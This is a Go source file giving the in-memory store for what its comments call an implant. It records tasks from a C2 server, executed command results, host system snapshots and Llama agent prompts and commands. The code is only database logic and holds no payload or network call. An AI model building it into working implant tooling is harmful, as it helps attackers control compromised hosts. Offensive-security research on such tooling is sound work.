package memdb

import (
	"fmt"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/hashicorp/go-memdb"
)

// DB represents the in-memory database for the implant
type DB struct {
	db *memdb.MemDB
	mu sync.RWMutex
}

// New creates a new in-memory database instance
func New() (*DB, error) {
	// Create the DB schema
	db, err := memdb.NewMemDB(Schema())
	if err != nil {
		return nil, fmt.Errorf("failed to create memdb: %w", err)
	}

	return &DB{
		db: db,
	}, nil
}

// StoreCommandResult stores a command execution result
func (d *DB) StoreCommandResult(cmd string, args []string, output string, err string, exitCode int, module string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	txn := d.db.Txn(true)
	defer txn.Abort()

	// Ensure non-empty values for indexed fields
	if cmd == "" {
		cmd = "<empty>"
	}
	if module == "" {
		module = "unknown"
	}

	result := &CommandResult{
		ID:        uuid.New().String(),
		Command:   cmd,
		Args:      args,
		Output:    output,
		Error:     err,
		ExitCode:  exitCode,
		StartTime: time.Now(),
		EndTime:   time.Now(),
		Module:    module,
	}

	if err := txn.Insert("command_results", result); err != nil {
		return fmt.Errorf("failed to insert command result: %w", err)
	}

	txn.Commit()
	return nil
}

// StoreServerTask stores a task received from the C2 server
func (d *DB) StoreServerTask(taskType, payload string) (*ServerTask, error) {
	return d.StoreServerTaskWithID(uuid.New().String(), taskType, payload)
}

// StoreServerTaskWithID stores a task with a specific ID (useful for maintaining request ID consistency)
func (d *DB) StoreServerTaskWithID(taskID, taskType, payload string) (*ServerTask, error) {
	d.mu.Lock()
	defer d.mu.Unlock()

	txn := d.db.Txn(true)
	defer txn.Abort()

	task := &ServerTask{
		ID:         taskID,
		Type:       taskType,
		Payload:    payload,
		Status:     "pending",
		ReceivedAt: time.Now(),
	}

	if err := txn.Insert("server_tasks", task); err != nil {
		return nil, fmt.Errorf("failed to insert server task: %w", err)
	}

	txn.Commit()
	return task, nil
}

// UpdateServerTask updates the status of a server task
func (d *DB) UpdateServerTask(taskID, status, result, errMsg string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	txn := d.db.Txn(true)
	defer txn.Abort()

	raw, err := txn.First("server_tasks", "id", taskID)
	if err != nil {
		return fmt.Errorf("failed to find task: %w", err)
	}
	if raw == nil {
		return fmt.Errorf("task not found: %s", taskID)
	}

	// Delete the old record first
	if err := txn.Delete("server_tasks", raw); err != nil {
		return fmt.Errorf("failed to delete existing server task: %w", err)
	}

	// Update the task
	task := raw.(*ServerTask)
	task.Status = status
	task.Result = result
	task.Error = errMsg
	now := time.Now()
	task.CompletedAt = &now

	// Insert updated record
	if err := txn.Insert("server_tasks", task); err != nil {
		return fmt.Errorf("failed to update server task: %w", err)
	}

	txn.Commit()
	return nil
}

// StoreLlamaInteraction stores a Llama prompt and response (updates if exists)
func (d *DB) StoreLlamaInteraction(taskID, prompt, response, taskType string, temperature float32, commands []string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	txn := d.db.Txn(true)
	defer txn.Abort()

	// Check if we already have a record for this taskID
	existing, err := txn.First("llama_interactions", "task_id", taskID)
	if err != nil {
		return fmt.Errorf("failed to query existing interaction: %w", err)
	}

	if existing != nil {
		// Update existing record
		interaction := existing.(*LlamaInteraction)

		// Delete the old record first
		if err := txn.Delete("llama_interactions", existing); err != nil {
			return fmt.Errorf("failed to delete existing llama interaction: %w", err)
		}

		// Update fields
		interaction.Response = response
		interaction.EndTime = time.Now()
		interaction.CommandsIssued = commands
		interaction.Status = "success"

		// Insert updated record
		if err := txn.Insert("llama_interactions", interaction); err != nil {
			return fmt.Errorf("failed to update llama interaction: %w", err)
		}
	} else {
		// Create new record
		interaction := &LlamaInteraction{
			ID:             uuid.New().String(),
			TaskID:         taskID,
			Prompt:         prompt,
			Response:       response,
			TaskType:       taskType,
			StartTime:      time.Now(),
			EndTime:        time.Now(),
			Temperature:    temperature,
			CommandsIssued: commands,
			Status:         "success",
		}

		if err := txn.Insert("llama_interactions", interaction); err != nil {
			return fmt.Errorf("failed to insert llama interaction: %w", err)
		}
	}

	txn.Commit()
	return nil
}

// StoreLlamaTaskStart stores the start of a Llama task (for background tasks)
func (d *DB) StoreLlamaTaskStart(taskID, prompt, taskType string, temperature float32) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	txn := d.db.Txn(true)
	defer txn.Abort()

	interaction := &LlamaInteraction{
		ID:             uuid.New().String(),
		TaskID:         taskID,
		Prompt:         prompt,
		Response:       "", // Will be filled when task completes
		TaskType:       taskType,
		StartTime:      time.Now(),
		EndTime:        time.Time{}, // Zero time until completed
		Temperature:    temperature,
		CommandsIssued: []string{},
		Status:         "running",
	}

	if err := txn.Insert("llama_interactions", interaction); err != nil {
		return fmt.Errorf("failed to insert llama task start: %w", err)
	}

	txn.Commit()
	return nil
}

// StoreSystemInfo stores a system information snapshot
func (d *DB) StoreSystemInfo(cpuUsage float64, memUsage uint64, diskUsage, networkIO map[string]uint64, processes int) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	txn := d.db.Txn(true)
	defer txn.Abort()

	info := &SystemInfo{
		ID:          uuid.New().String(),
		Timestamp:   time.Now(),
		CPUUsage:    cpuUsage,
		MemoryUsage: memUsage,
		DiskUsage:   diskUsage,
		NetworkIO:   networkIO,
		Processes:   processes,
	}

	if err := txn.Insert("system_info", info); err != nil {
		return fmt.Errorf("failed to insert system info: %w", err)
	}

	txn.Commit()
	return nil
}

// GetRecentCommands retrieves recent command results
func (d *DB) GetRecentCommands(limit int) ([]*CommandResult, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	txn := d.db.Txn(false)
	defer txn.Abort()

	it, err := txn.ReverseLowerBound("command_results", "start_time", time.Now())
	if err != nil {
		return nil, fmt.Errorf("failed to query commands: %w", err)
	}

	var results []*CommandResult
	for obj := it.Next(); obj != nil && len(results) < limit; obj = it.Next() {
		results = append(results, obj.(*CommandResult))
	}

	return results, nil
}

// GetPendingTasks retrieves pending server tasks
func (d *DB) GetPendingTasks() ([]*ServerTask, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	txn := d.db.Txn(false)
	defer txn.Abort()

	it, err := txn.Get("server_tasks", "status", "pending")
	if err != nil {
		return nil, fmt.Errorf("failed to query pending tasks: %w", err)
	}

	var tasks []*ServerTask
	for obj := it.Next(); obj != nil; obj = it.Next() {
		tasks = append(tasks, obj.(*ServerTask))
	}

	return tasks, nil
}

// GetTaskByID retrieves a specific task by its ID
func (d *DB) GetTaskByID(taskID string) (*ServerTask, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	txn := d.db.Txn(false)
	defer txn.Abort()

	raw, err := txn.First("server_tasks", "id", taskID)
	if err != nil {
		return nil, fmt.Errorf("failed to query task: %w", err)
	}
	if raw == nil {
		return nil, fmt.Errorf("task not found: %s", taskID)
	}

	return raw.(*ServerTask), nil
}

// GetPendingLlamaTasks retrieves pending Llama tasks (tasks with type starting with "llama_")
func (d *DB) GetPendingLlamaTasks() ([]*ServerTask, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	txn := d.db.Txn(false)
	defer txn.Abort()

	it, err := txn.Get("server_tasks", "status", "pending")
	if err != nil {
		return nil, fmt.Errorf("failed to query pending tasks: %w", err)
	}

	var tasks []*ServerTask
	for obj := it.Next(); obj != nil; obj = it.Next() {
		task := obj.(*ServerTask)
		// Filter only Llama tasks
		if len(task.Type) >= 6 && task.Type[:6] == "llama_" {
			tasks = append(tasks, task)
		}
	}

	return tasks, nil
}

// ClaimNextPendingLlamaTask atomically retrieves and marks a pending Llama task as processing
// Returns nil if no pending task is available
func (d *DB) ClaimNextPendingLlamaTask() (*ServerTask, error) {
	d.mu.Lock()
	defer d.mu.Unlock()

	txn := d.db.Txn(true)
	defer txn.Abort()

	// Get pending tasks
	it, err := txn.Get("server_tasks", "status", "pending")
	if err != nil {
		return nil, fmt.Errorf("failed to query pending tasks: %w", err)
	}

	// Find first Llama task
	for obj := it.Next(); obj != nil; obj = it.Next() {
		task := obj.(*ServerTask)
		// Filter only Llama tasks
		if len(task.Type) >= 6 && task.Type[:6] == "llama_" {
			// Found a task - claim it by updating status to processing
			updatedTask := &ServerTask{
				ID:          task.ID,
				Type:        task.Type,
				Payload:     task.Payload,
				Status:      "processing",
				ReceivedAt:  task.ReceivedAt,
				CompletedAt: task.CompletedAt,
				Result:      task.Result,
				Error:       task.Error,
			}

			// Delete old task
			if err := txn.Delete("server_tasks", task); err != nil {
				return nil, fmt.Errorf("failed to delete task during claim: %w", err)
			}

			// Insert updated task
			if err := txn.Insert("server_tasks", updatedTask); err != nil {
				return nil, fmt.Errorf("failed to insert updated task during claim: %w", err)
			}

			txn.Commit()
			return updatedTask, nil
		}
	}

	// No pending Llama task found
	return nil, nil
}

// GetTasksByType retrieves tasks filtered by type with optional limit
func (d *DB) GetTasksByType(taskType string, limit int) ([]*ServerTask, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	txn := d.db.Txn(false)
	defer txn.Abort()

	it, err := txn.Get("server_tasks", "type", taskType)
	if err != nil {
		return nil, fmt.Errorf("failed to query tasks by type: %w", err)
	}

	var tasks []*ServerTask
	for obj := it.Next(); obj != nil; obj = it.Next() {
		tasks = append(tasks, obj.(*ServerTask))
		if limit > 0 && len(tasks) >= limit {
			break
		}
	}

	return tasks, nil
}

// GetTasksByStatus retrieves tasks filtered by status with optional limit
func (d *DB) GetTasksByStatus(status string, limit int) ([]*ServerTask, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	txn := d.db.Txn(false)
	defer txn.Abort()

	it, err := txn.Get("server_tasks", "status", status)
	if err != nil {
		return nil, fmt.Errorf("failed to query tasks by status: %w", err)
	}

	var tasks []*ServerTask
	for obj := it.Next(); obj != nil; obj = it.Next() {
		tasks = append(tasks, obj.(*ServerTask))
		if limit > 0 && len(tasks) >= limit {
			break
		}
	}

	return tasks, nil
}

// GetRecentLlamaInteractions retrieves recent Llama interactions
func (d *DB) GetRecentLlamaInteractions(limit int) ([]*LlamaInteraction, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	txn := d.db.Txn(false)
	defer txn.Abort()

	it, err := txn.ReverseLowerBound("llama_interactions", "start_time", time.Now())
	if err != nil {
		return nil, fmt.Errorf("failed to query llama interactions: %w", err)
	}

	var interactions []*LlamaInteraction
	for obj := it.Next(); obj != nil && len(interactions) < limit; obj = it.Next() {
		interactions = append(interactions, obj.(*LlamaInteraction))
	}

	return interactions, nil
}

// GetSystemInfoHistory retrieves system info history
func (d *DB) GetSystemInfoHistory(since time.Time) ([]*SystemInfo, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	txn := d.db.Txn(false)
	defer txn.Abort()

	it, err := txn.LowerBound("system_info", "timestamp", since)
	if err != nil {
		return nil, fmt.Errorf("failed to query system info: %w", err)
	}

	var infos []*SystemInfo
	for obj := it.Next(); obj != nil; obj = it.Next() {
		infos = append(infos, obj.(*SystemInfo))
	}

	return infos, nil
}

// ClearOldData removes data older than the specified duration
func (d *DB) ClearOldData(olderThan time.Duration) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	txn := d.db.Txn(true)
	defer txn.Abort()

	cutoff := time.Now().Add(-olderThan)

	// Clear old command results
	it, err := txn.Get("command_results", "id")
	if err != nil {
		return fmt.Errorf("failed to query command results: %w", err)
	}

	var toDeleteCmd []*CommandResult
	for obj := it.Next(); obj != nil; obj = it.Next() {
		cmd := obj.(*CommandResult)
		if cmd.StartTime.Before(cutoff) {
			toDeleteCmd = append(toDeleteCmd, cmd)
		}
	}

	for _, cmd := range toDeleteCmd {
		if err := txn.Delete("command_results", cmd); err != nil {
			return fmt.Errorf("failed to delete command result: %w", err)
		}
	}

	// Clear old llama interactions
	it, err = txn.Get("llama_interactions", "id")
	if err != nil {
		return fmt.Errorf("failed to query llama interactions: %w", err)
	}

	var toDeleteLlama []*LlamaInteraction
	for obj := it.Next(); obj != nil; obj = it.Next() {
		interaction := obj.(*LlamaInteraction)
		if interaction.StartTime.Before(cutoff) {
			toDeleteLlama = append(toDeleteLlama, interaction)
		}
	}

	for _, interaction := range toDeleteLlama {
		if err := txn.Delete("llama_interactions", interaction); err != nil {
			return fmt.Errorf("failed to delete llama interaction: %w", err)
		}
	}

	// Clear old system info
	it, err = txn.Get("system_info", "id")
	if err != nil {
		return fmt.Errorf("failed to query system info: %w", err)
	}

	var toDeleteInfo []*SystemInfo
	for obj := it.Next(); obj != nil; obj = it.Next() {
		info := obj.(*SystemInfo)
		if info.Timestamp.Before(cutoff) {
			toDeleteInfo = append(toDeleteInfo, info)
		}
	}

	for _, info := range toDeleteInfo {
		if err := txn.Delete("system_info", info); err != nil {
			return fmt.Errorf("failed to delete system info: %w", err)
		}
	}

	// Clear old llama observations
	it, err = txn.Get("llama_observations", "id")
	if err != nil {
		return fmt.Errorf("failed to query llama observations: %w", err)
	}

	var toDeleteObs []*LlamaObservation
	for obj := it.Next(); obj != nil; obj = it.Next() {
		obs := obj.(*LlamaObservation)
		if obs.Timestamp.Before(cutoff) {
			toDeleteObs = append(toDeleteObs, obs)
		}
	}

	for _, obs := range toDeleteObs {
		if err := txn.Delete("llama_observations", obs); err != nil {
			return fmt.Errorf("failed to delete llama observation: %w", err)
		}
	}

	txn.Commit()
	return nil
}

// StoreLlamaObservation stores an observation from a Llama ReAct execution
func (d *DB) StoreLlamaObservation(obs *LlamaObservation) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	txn := d.db.Txn(true)
	defer txn.Abort()

	// Ensure ID is set
	if obs.ID == "" {
		obs.ID = uuid.New().String()
	}

	// Ensure timestamp is set
	if obs.Timestamp.IsZero() {
		obs.Timestamp = time.Now()
	}

	if err := txn.Insert("llama_observations", obs); err != nil {
		return fmt.Errorf("failed to insert llama observation: %w", err)
	}

	txn.Commit()
	return nil
}

// GetLlamaObservationsByTask retrieves all observations for a specific task
func (d *DB) GetLlamaObservationsByTask(taskID string) ([]*LlamaObservation, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	txn := d.db.Txn(false)
	defer txn.Abort()

	it, err := txn.Get("llama_observations", "task_id", taskID)
	if err != nil {
		return nil, fmt.Errorf("failed to query llama observations: %w", err)
	}

	var observations []*LlamaObservation
	for obj := it.Next(); obj != nil; obj = it.Next() {
		observations = append(observations, obj.(*LlamaObservation))
	}

	return observations, nil
}

// GetLlamaObservationsByIteration retrieves observations for a specific task and iteration
func (d *DB) GetLlamaObservationsByIteration(taskID string, iteration int) ([]*LlamaObservation, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	txn := d.db.Txn(false)
	defer txn.Abort()

	// Get all observations for this task
	it, err := txn.Get("llama_observations", "task_id", taskID)
	if err != nil {
		return nil, fmt.Errorf("failed to query llama observations: %w", err)
	}

	// Filter by iteration
	var observations []*LlamaObservation
	for obj := it.Next(); obj != nil; obj = it.Next() {
		obs := obj.(*LlamaObservation)
		if obs.Iteration == iteration {
			observations = append(observations, obs)
		}
	}

	return observations, nil
}

// GetRecentLlamaObservations retrieves recent observations across all tasks
func (d *DB) GetRecentLlamaObservations(limit int) ([]*LlamaObservation, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	txn := d.db.Txn(false)
	defer txn.Abort()

	it, err := txn.ReverseLowerBound("llama_observations", "timestamp", time.Now())
	if err != nil {
		return nil, fmt.Errorf("failed to query llama observations: %w", err)
	}

	var observations []*LlamaObservation
	for obj := it.Next(); obj != nil && len(observations) < limit; obj = it.Next() {
		observations = append(observations, obj.(*LlamaObservation))
	}

	return observations, nil
}

// Stats returns database statistics
func (d *DB) Stats() (map[string]int, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	txn := d.db.Txn(false)
	defer txn.Abort()

	stats := make(map[string]int)

	// Count command results
	it, _ := txn.Get("command_results", "id")
	count := 0
	for obj := it.Next(); obj != nil; obj = it.Next() {
		count++
	}
	stats["command_results"] = count

	// Count server tasks
	it, _ = txn.Get("server_tasks", "id")
	count = 0
	for obj := it.Next(); obj != nil; obj = it.Next() {
		count++
	}
	stats["server_tasks"] = count

	// Count llama interactions
	it, _ = txn.Get("llama_interactions", "id")
	count = 0
	for obj := it.Next(); obj != nil; obj = it.Next() {
		count++
	}
	stats["llama_interactions"] = count

	// Count system info
	it, _ = txn.Get("system_info", "id")
	count = 0
	for obj := it.Next(); obj != nil; obj = it.Next() {
		count++
	}
	stats["system_info"] = count

	// Count llama observations
	it, _ = txn.Get("llama_observations", "id")
	count = 0
	for obj := it.Next(); obj != nil; obj = it.Next() {
		count++
	}
	stats["llama_observations"] = count

	return stats, nil
}
